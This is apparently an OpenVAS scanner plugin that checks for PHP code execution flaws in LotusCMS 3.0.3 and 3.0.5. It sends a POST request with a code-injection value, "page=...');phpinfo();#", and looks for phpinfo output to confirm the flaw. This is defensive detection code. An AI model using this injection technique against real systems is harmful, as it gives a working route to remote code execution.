###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_lotuscms_php_code_exec_2011.nasl 11855 2018-10-12 07:34:51Z cfischer $
#
# LotusCMS PHP Code Execution Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103444");
  script_version("$Revision: 11855 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("LotusCMS PHP Code Execution Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/secunia_research/2011-21/");
  script_xref(name:"URL", value:"http://www.lotuscms.org/");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 09:34:51 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-03-07 11:02:50 +0100 (Wed, 07 Mar 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"LotusCMS is prone to two PHP Code Execution Vulnerabilities because it
fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to execute arbitrary PHP code.");

  script_tag(name:"affected", value:"LotusCMS 3.0.3 and 3.0.5 are vulnerable, other versions may also be
affected.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/lcms", "/cms", "/lotuscms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.php";
  buf = http_get_cache( item:url, port:port );

  if( buf =~ "Powered by.*LotusCMS" || 'content="LotusCMS"' >< buf ) {

    p = eregmatch( pattern:"index.php\?page=([a-zA-Z0-9]+)", string:buf );
    if( isnull( p[1] ) ) continue;

    host = http_host_name( port:port );
    page = p[1];
    ex = "page=" + page + "');phpinfo();#";
    len = strlen(ex);

    req = string("POST ",url," HTTP/1.1\r\n",
                 "Host: ",host,"\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ",len,"\r\n",
                 "\r\n",
                  ex,
                 "\r\n\r\n");
    res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( "<title>phpinfo()" >< res ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
